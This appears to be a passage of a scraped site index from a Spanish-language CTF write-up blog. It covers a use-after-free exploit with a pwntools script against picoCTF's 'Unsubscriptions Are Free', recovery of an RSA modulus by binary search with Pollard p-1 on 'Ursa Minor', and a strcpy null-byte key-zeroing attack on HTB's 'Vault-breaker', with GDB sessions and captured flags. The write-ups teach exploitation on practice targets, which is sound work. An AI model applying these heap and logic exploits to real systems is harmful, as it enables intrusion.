valor del puntero whatToDo (ahora está vacío) Hay un valor 0x0804c010 en la dirección 0x804c1a0, que es el puntero a la cadena username. Pero no hay ninguna cadena en esta dirección, está apuntando a la dirección del primer punto:  gef➤ x/16x 0x0804c010 - 0x10 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000001\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  Vamos a continuar dejando un mensaje:\ngef➤ continue Continuing. Welcome to my stream! ^W^ ========================== (S)ubscribe to my channel (I)nquire about account deletion (M)ake an Twixer account (P)ay for premium membership (l)eave a message(with or without logging in) (e)xit L I only read premium member messages but you can try anyways: AAAABBB Program received signal SIGSEGV, Segmentation fault. 0x41414141 in ?? ()  Perfecto, hemos cambiado el flujo de ejecución del programa y tenemos control sobre la siguiente dirección a llamar (en este caso AAAA o 0x41414141).\nExaminamos el heap una vez más:\ngef➤ x/120x 0x0804c000 0x804c000:\t0x00000000\t0x00000000\t0x00000000\t0x00000191 0x804c010:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c020:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c030:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c040:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c050:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c060:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c070:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c080:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c090:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0a0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0b0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0e0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c0f0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c100:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c110:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c120:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c130:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c140:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c150:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c160:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c170:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c180:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c190:\t0x00000000\t0x00000000\t0x00000000\t0x00000011 0x804c1a0:\t0x41414141\t0x0a424242\t0x00000000\t0x00000411 0x804c1b0:\t0x0a410a6c\t0x00000000\t0x00000000\t0x00000000 0x804c1c0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000 0x804c1d0:\t0x00000000\t0x00000000\t0x00000000\t0x00000000  ¿Ves lo que ha pasado? La función leaveMessage ha llamado a malloc para reservar 8 bytes de memoria para nuestro mensaje (AAAABBB más el carácter de salto de línea). Sin embargo, previamente hemos liberado la memoria de la estructura user con free. El comportamiento de free no es limpiar el espacio de memoria (eso se haría con memset), sino markar la dirección de memoria como libre, de manera que pueda ser reutilizada más adelante.\nLa vulnerabilidad aquí se llama Use After Free, cuyo nombre es auto-explicativo. La dirección de memoria se marca como libre, y la siguiente llamada a malloc cogerá esta misma dirección recién liberada. Por tanto, al escribir el mensaje estamos escribiendo donde estaba la estructura de user original. Por tanto, podemos escribir la dirección que queramos en whatToDo (por ejemplo, la dirección de hahaexploitgobrrr).\nEste es un script en Python con pwntools para obtener la flag:\n#!/usr/bin/env python3 from pwn import context, log, p32, remote, sys context.binary = 'vuln' def get_process(): if len(sys.argv) == 1: return context.binary.process() host, port = sys.argv[1], sys.argv[2] return remote(host, int(port)) def main(): p = get_process() p.sendlineafter(b'(e)xit\\n', b'S') p.recvuntil(b'OOP! Memory leak...') leak = int(p.recvline().decode().strip(), 16) p.sendlineafter(b'(e)xit\\n', b'M') p.sendlineafter(b'Enter your username: \\n', b'AAA') p.sendlineafter(b'(e)xit\\n', b'I') p.sendlineafter(b'(Y/N)?\\n', b'Y') p.sendlineafter(b'(e)xit\\n', b'L') p.sendlineafter(b'try anyways:\\n', p32(leak)) flag = p.recvline().decode().strip() p.close() log.success(f'Flag: {flag}') if __name__ == '__main__': main()  $ python3 solve.py mercury.picoctf.net 4593 [*] './vuln' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) [+] Opening connection to mercury.picoctf.net on port 4593: Done [*] Closed connection to mercury.picoctf.net port 4593 [+] Flag: picoCTF{d0ubl3_j30p4rdy_ba307b82}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/unsubscriptions-are-free/","section":"ctf","summary":"picoCTF 2021. 100 puntos. Binario de 32 bits. Explotación del heap. Use After Free","time":9,"title":"Unsubscriptions Are Free"},{"contents":"Se nos proporciona el siguiente código y una instancia a la que conectarnos:\n#!/usr/local/bin/python # # Polymero # # Imports fromCrypto.Util.numberimportisPrime, getPrime, inverse importhashlib, time, os # Local import FLAG=os.environ.get('FLAG').encode() classURSA: # Upgraded RSA (faster and with cheap key cycling) def__init__(self, pbit, lbit): p, q=self.prime_gen(pbit, lbit) self.public={'n': p*q, 'e': 0x10001} self.private={'p': p, 'q': q, 'f': (p-1)*(q-1), 'd': inverse(self.public['e'], (p-1)*(q-1))}  defprime_gen(self, pbit, lbit): # Smooth primes are FAST primes ~ ! whileTrue: qlst=[getPrime(lbit) for_inrange(pbit//lbit)] iflen(qlst) -len(set(qlst)) \u0026lt;=1: continue q=1 forqlinqlst: q*=ql Q=2*q+1 ifisPrime(Q): break whileTrue: plst=[getPrime(lbit) for_inrange(pbit//lbit)] iflen(plst) -len(set(plst)) \u0026lt;=1: continue p=1 forplinplst: p*=pl P=2*p+1 ifisPrime(P): break returnP, Q  defupdate_key(self): # Prime generation is expensive, so we'll just update d and e instead ^w^ self.private['d'] ^=int.from_bytes(hashlib.sha512((str(self.private['d']) +str(time.time())).encode()).digest(), 'big') self.private['d'] %=self.private['f'] self.public['e'] =inverse(self.private['d'], self.private['f'])  defencrypt(self, m_int): c_lst=[] whilem_int: c_lst+=[pow(m_int, self.public['e'], self.public['n'])] m_int//=self.public['n'] returnc_lst  defdecrypt(self, c_int): m_lst=[] whilec_int: m_lst+=[pow(c_int, self.private['d'], self.public['n'])] c_int//=self.public['n'] returnm_lst # Challenge setup print(\"\"\"| | ~ Welcome to URSA decryption services | Press enter to start key generation...\"\"\") input(\"|\") print(\"\"\"| | Please hold on while we generate your primes... |\\n|\"\"\")  oracle=URSA(256, 12) print(\"| ~ You are connected to an URSA-256-12 service,public key ::\") print(\"| id = {}\".format(hashlib.sha256(str(oracle.public['n']).encode()).hexdigest())) print(\"| e = {}\".format(oracle.public['e'])) print(\"|\\n| ~ Here is a free flag sample, enjoy ::\") foriinoracle.encrypt(int.from_bytes(FLAG, 'big')): print(\"| {}\".format(i)) MENU=\"\"\"| | ~ Menu (key updated after {}requests):: | [E]ncrypt | [D]ecrypt | [U]pdate key | [Q]uit |\"\"\" # Server loop CYCLE=0 whileTrue:  try: ifCYCLE%4: print(MENU.format(4-CYCLE)) choice=input(\"| \u0026gt; \") else: choice='u'  ifchoice.lower() =='e': msg=int(input(\"|\\n| \u0026gt; (int) \")) print(\"|\\n| ~ Encryption ::\") foriinoracle.encrypt(msg): print(\"| {}\".format(i)) elifchoice.lower() =='d': cip=int(input(\"|\\n| \u0026gt; (int) \")) print(\"|\\n| ~ Decryption ::\") foriinoracle.decrypt(cip): print(\"| {}\".format(i))  elifchoice.lower() =='u': oracle.update_key() print(\"|\\n| ~ Key updated succesfully ::\") print(\"| id = {}\".format(hashlib.sha256(str(oracle.public['n']).encode()).hexdigest())) print(\"| e = {}\".format(oracle.public['e'])) CYCLE=0  elifchoice.lower() =='q': print(\"|\\n| ~ Closing services...\\n|\") break  else: print(\"|\\n| ~ ERROR - Unknown command\") CYCLE+=1  exceptKeyboardInterrupt: print(\"\\n| ~ Closing services...\\n|\") break  except: print(\"|\\n| ~ Please do NOT abuse our services.\\n|\")  El servidor genera dos números primos lisos (smooth primes) $p$ y $q$ (que significa que $p - 1$ y $q - 1$ se pueden factorizar fácilmente en factores pequeños). Sin embargo, no nos dan $n = p \\cdot q$, sino el hash SHA256 de $n$. Por otro lado, $e = 65537$, como habitualmente. La flag se cifra con RSA según los parámetros generados.\nDespués, nos dan la oportunidad de cifrar mensajes, descifrar mensajes o actualizar la clave.\nMe resultó extraña la función encrypt:\ndefencrypt(self, m_int): c_lst=[] whilem_int: c_lst+=[pow(m_int, self.public['e'], self.public['n'])] m_int//=self.public['n'] returnc_lst  En primer lugar, el mensaje tiene que ser enviado en formato decimal. Además, si el número es mayor que $n$, la función realizará más de una iteración del bucle while. Entonces, podemos obtener $n$ mediante Búsqueda Binaria:\nIntroducimos un número $x$. Si $x \\geq n$, el servidor devolverá más de un texto cifrado; y si $x \u0026lt; n$, el servidor responderá con un único texto cifrado. Por tanto, podemos poner dos límites (por ejemplo, $2^{256}$ y $2^{512}$) y dividir el intervalo con Búsqueda Binaria hasta encontrar $n$:\na, b=2**256, 2**512 whilea+1!=b: test_n=(a+b) //2 iflen(encrypt(r, test_n)) \u0026gt;1: b=test_n else: a=test_n n=aifa%2elseb print(n, a, b) asserthashlib.sha256(str(n).encode()).hexdigest() ==n_id_hex  Para verificar que es correcto, podemos comprobar que el hash SHA256 de $n$ coincide con el que envió el servidor al principio.\nUna vez que tenemos $n$, podemos usar el algoritmo p - 1 de Pollard para factorizarlo y descifrar la flag como en la mayoría de retos de RSA:\np, q=pollard_p_1(n) assertn==p*q phi_n=(p-1) *(q-1) d=pow(e, -1, phi_n) m=pow(flag_enc, d, n) print(bytes.fromhex(hex(m)[2:])) r.close()  Y así conseguimos la flag:\n$ python3 solve.py blackhat2-09afaf950bafc7bc0c7c3d69fcaeb7df-0.chals.bh.ctf.sa [+] Opening connection to blackhat2-09afaf950bafc7bc0c7c3d69fcaeb7df-0.chals.bh.ctf.sa on port 443: Done b'BlackHatMEA{96:19:07a094190d0777d995d4bb9f504a494631855c36}' [*] Closed connection to blackhat2-09afaf950bafc7bc0c7c3d69fcaeb7df-0.chals.bh.ctf.sa port 443  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/other/ursa-minor/","section":"ctf","summary":"BlackHat MEA CTF 2022. RSA. Búsqueda binaria. Primos lisos","time":2,"title":"Ursa Minor"},{"contents":"Se nos proporciona un binario de 64 bits llamado vault-breaker:\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./.glibc/'  Si lo ejecutamos, tenemos dos opciones:\n$ ./vault-breaker Current status: Unlocked🔓 ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓▓▓▒▒▒▒▒▒░░ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░▒▒▒▒▒▒▒▒░░░░░░░░░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒░░▒▒░░████▓▓████░░▒▒▓▓▓▓▓▓▓▓▓▓░░▒▒░░ ░░░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░▒▒▓▓░░▓▓▒▒▒▒▒▒░░░░▒▒▓▓██▒▒▒▒▓▓▓▓▓▓░░░░ ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░▒▒▒▒▓▓░░▓▓░░██▓▓▓▓▓▓▒▒▒▒██░░▓▓▓▓▒▒▒▒ ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓░░░░▓▓▒▒░░▒▒██░░██▒▒▒▒▒▒▒▒██▒▒▒▒██▓▓▒▒▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▒▒▓▓▒▒▓▓░░▒▒▓▓▒▒▒▒░░░░░░▒▒██░░██▒▒▒▒ ▒▒▒▒▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▒▒░░░░▓▓▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░▒▒▓▓▓▓▓▓▒▒ ░░▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▒▒▒▒▒▒▓▓░░▓▓░░░░░░░░▒▒▒▒██▒▒██▒▒ ▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓░░░░▓▓▓▓▓▓▒▒░░▒▒▓▓░░░░░░░░░░▒▒▒▒▓▓▒▒██░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▓▓▒▒░░▒▒▓▓░░▒▒░░░░░░░░░░▓▓▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▒▒▒▒▒▒▓▓▒▒░░░░░░░░░░░░▒▒▒▒██▒▒ ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓████▓▓▒▒▒▒░░▓▓▒▒░░░░▒▒░░▒▒▒▒▓▓▒▒▓▓░░ ▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▓▓▓▓▒▒▓▓░░░░░░▒▒░░▒▒▓▓▓▓██▒▒ ░░▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓██▒▒░░▒▒▒▒▓▓▒▒░░░░▒▒▒▒▓▓▓▓▒▒░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓██▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒██▒▒░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒░░▓▓▒▒▒▒▒▒▓▓▒▒██▒▒▓▓▓▓░░░░ ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓██▓▓▒▒██▒▒░░▒▒▒▒▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓░░░░ ░░░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓██▓▓████▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░░░░░░░ ░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓██▒▒▓▓▒▒▒▒░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░░░░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▒▒▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓████████▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ [+] Random secure encryption key has been generated! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt;  Si usamos Ghidra para descompilar el binario, podemos ver esta función main:\nvoidmain() { longoption; setup(); banner(); key_gen(); fprintf(stdout, \"%s\\n[+] Random secure encryption key has been generated!\\n%s\", \u0026amp;DAT_00103142, \u0026amp;DAT_001012f8); fflush(stdout); while(true) { while(true) { printf(\u0026amp;DAT_00105160, \u0026amp;DAT_001012f8); option =read_num(); if(option !=1) break; new_key_gen(); } if(option !=2) break; secure_password(); } printf(\"%s\\n[-] Invalid option, exiting..\\n\", \u0026amp;DAT_00101300); /* WARNING: Subroutine does not return */ exit(0x45); }  La primera opción llama new_key_gen:\nvoidnew_key_gen() { intfd; FILE *__stream; longin_FS_OFFSET; ulong i; ulong length; charnew_key[40]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); i =0; length =0x22; __stream =fopen(\"/dev/urandom\", \"rb\"); if(__stream ==(FILE *) 0x0) { fprintf(stdout, \"\\n%sError opening /dev/urandom, exiting..\\n\", \u0026amp;DAT_00101300); /* WARNING: Subroutine does not return */ exit(0x15); } while(0x1f\u0026lt;length) { printf(\"\\n[*] Length of new password (0-%d): \", 31); length =read_num(); } memset(new_key, 0, 32); fd =fileno(__stream); read(fd, new_key, length); for(; i \u0026lt;length; i =i +1) { while(new_key[i] =='\\0') { fd =fileno(__stream); read(fd, new_key +i, 1); } } strcpy(random_key, new_key); fclose(__stream); printf(\"\\n%s[+] New key has been genereated successfully!\\n%s\", \u0026amp;DAT_00103142, \u0026amp;DAT_001012f8); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; }  Esta función tiene un error que puede ser explotado. Sin embargo, vamos a ver para qué sirve la segunda opción.\nLa segunda opción llama a secure_password:\nvoidsecure_password() { char*__buf; int__fd; ulong uVar1; size_tsVar2; longin_FS_OFFSET; characStack136[24]; undefined8 uStack112; inti; intlocal_64; char*local_60; undefined8 local_58; char*flag; FILE *fp; undefined8 canary;  canary =*(undefined8 *) (in_FS_OFFSET +0x28); uStack112 =0x100c26; puts(\"\\x1b[1;34m\"); uStack112 =0x100c4c; printf(\u0026amp;DAT_00101308, \u0026amp;DAT_001012f8, \u0026amp;DAT_00101300, \u0026amp;DAT_001012f8); local_60 =\u0026amp;DAT_00101330; local_64 =0x17; local_58 =0x16; flag =acStack136; memset(acStack136, 0, 0x17); fp =fopen(\"flag.txt\", \"rb\"); __buf =flag; if(fp ==(FILE *) 0x0) { fprintf(stderr, \"\\n%s[-] Error opening flag.txt, contact an Administrator..\\n\", \u0026amp;DAT_00101300); /* WARNING: Subroutine does not return */ exit(0x15); } sVar2 =(size_t) local_64; __fd =fileno(fp); read(__fd, __buf, sVar2); fclose(fp); puts(local_60); fwrite(\"\\nMaster password for Vault: \", 1, 0x1c, stdout); i =0; while(true) { uVar1 =(ulong) i; sVar2 =strlen(flag); if(sVar2 \u0026lt;=uVar1) break; putchar((int) (char) (random_key[i] ^flag[i])); i =i +1; } puts(\"\\n\"); /* WARNING: Subroutine does not return */ exit(0x1b39); }  Aquí vemos que secure_password imprime la flag cifrada mediante XOR y random_key.\nLa idea aquí es abusar del bug en new_key_gen de manera que sobrescribimos random_key con bytes nulos y el cifrado XOR no haría nada.\nEl problema está aquí:\nstrcpy(random_key, new_key);  La variable new_key tiene un numero dado de valores aleatorios (desde 0 hasta 31). El problema es que strcpy interpreta new_key como una string, que está terminada con un byte nulo. Y este byte nulo se copia en random_key.\nLa idea es cambiar la clave comenzando por longitud 31 y bajar hasta 0. En este punto, tendremos una variable random_key nula. Vamos a ver algunos pasos con GDB:\n$ gdb -q vault-breaker Reading symbols from vault-breaker... (No debugging symbols found in vault-breaker) gef➤ disassemble new_key_gen Dump of assembler code for function new_key_gen: 0x0000000000001026 \u0026lt;+0\u0026gt;: push rbp ... 0x000000000000113d \u0026lt;+279\u0026gt;: cmp rax,QWORD PTR [rbp-0x50] 0x0000000000001141 \u0026lt;+283\u0026gt;: jb 0x1122 \u0026lt;new_key_gen+252\u0026gt; 0x0000000000001143 \u0026lt;+285\u0026gt;: lea rax,[rbp-0x40] 0x0000000000001147 \u0026lt;+289\u0026gt;: mov rsi,rax 0x000000000000114a \u0026lt;+292\u0026gt;: lea rdi,[rip+0x204f0f] # 0x206060 \u0026lt;random_key\u0026gt; 0x0000000000001151 \u0026lt;+299\u0026gt;: call 0x9d0 \u0026lt;strcpy@plt\u0026gt; 0x0000000000001156 \u0026lt;+304\u0026gt;: mov rax,QWORD PTR [rbp-0x48] 0x000000000000115a \u0026lt;+308\u0026gt;: mov rdi,rax 0x000000000000115d \u0026lt;+311\u0026gt;: call 0x9f0 \u0026lt;fclose@plt\u0026gt; ... 0x0000000000001196 \u0026lt;+368\u0026gt;: add rsp,0x58 0x000000000000119a \u0026lt;+372\u0026gt;: pop rbx 0x000000000000119b \u0026lt;+373\u0026gt;: pop rbp 0x000000000000119c \u0026lt;+374\u0026gt;: ret End of assembler dump. gef➤ break *new_key_gen+299 Breakpoint 1 at 0x1151 gef➤ start Starting program: /home/rocky/Desktop/HTB/Challenges/Pwn/Vault-breaker/vault-breaker Current status: Unlocked 🔓 ... [+] Random secure encryption key has been generated! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt; 1 [*] Length of new password (0-31): 31 Breakpoint 1, 0x0000555555401151 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0x3a13df13164d2f9b 0x3e52423f3cde51c2 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x42b8e9edf141c794 0x7d9940e7ae4bf33e gef➤ x/4gx 0x007fffffffe600 0x7fffffffe600: 0x78d46927bf7ceb4a 0x1bdb7bc09e2832bb 0x7fffffffe610: 0x977650dac427a3fa 0x00dbb4767e5144df gef➤ ni Program received signal SIGALRM, Alarm clock. 0x0000555555401156 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0x78d46927bf7ceb4a 0x1bdb7bc09e2832bb 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x977650dac427a3fa 0x00dbb4767e5144df gef➤ continue Continuing. [+] New key has been genereated successfully! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt; 1 [*] Length of new password (0-31): 30 Breakpoint 1, 0x0000555555401151 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0x78d46927bf7ceb4a 0x1bdb7bc09e2832bb 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x977650dac427a3fa 0x00dbb4767e5144df gef➤ x/4gx 0x007fffffffe600 0x7fffffffe600: 0xf981c407429c1b43 0x85f070e2c1c8e444 0x7fffffffe610: 0x46d952b3d580c7dd 0x0000782791b7d021 gef➤ ni 0x0000555555401156 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0xf981c407429c1b43 0x85f070e2c1c8e444 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x46d952b3d580c7dd 0x0000782791b7d021 gef➤ continue Continuing. [+] New key has been genereated successfully! 1. Generate new key 🆕 2. Secure the Vault 🔒 \u0026gt; 1 [*] Length of new password (0-31): 29 Breakpoint 1, 0x0000555555401151 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0xf981c407429c1b43 0x85f070e2c1c8e444 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x46d952b3d580c7dd 0x0000782791b7d021 gef➤ x/4gx 0x007fffffffe600 0x7fffffffe600: 0xdec16a4ae0c0f28c 0x017ce2a4f208304d 0x7fffffffe610: 0x69b0acb732508fb3 0x0000009c2b0b449c gef➤ ni 0x0000555555401156 in new_key_gen ()  gef➤ x/4gx 0x00555555606060 0x555555606060 \u0026lt;random_key\u0026gt;: 0xdec16a4ae0c0f28c 0x017ce2a4f208304d 0x555555606070 \u0026lt;random_key+16\u0026gt;: 0x69b0acb732508fb3 0x0000009c2b0b449c  Pues con este proceso llenamos random_key con bytes nulos. Después, solamente tendríamos que pedir la flag cifrada. Todo esto se puede automatizar en un script en Python: solve.py.\n$ python3 solve.py 206.189.125.80:30580 [*] './vault-breaker' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./.glibc/' [+] Opening connection to 206.189.125.80 on port 30580: Done [◓] Number: 0 [*] Closed connection to 206.189.125.80 port 30580 HTB{d4nz4_kudur0r0r0}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/vault-breaker/","section":"ctf","summary":"Binario de 64 bits. Abusando de un error. Cifrado XOR","time":4,"title":"Vault-breaker"},{"contents":"Tenemos este texto cifrado:\nDETctysy{QzeffcgRgcBhsjdkf}  Y también una palabra extraña: blorpy.\nComo el reto se llama \u0026ldquo;Vigenère Cipher\u0026rdquo;, podemos deducir que el algoritmo de cifrado es precisamente el Cifrado Vigenère, que es un tipo de cifrado César de sustitución. Para descifrar el mensaje, podemos ir a CyberChef y usar blorpy como clave:\nFlag: 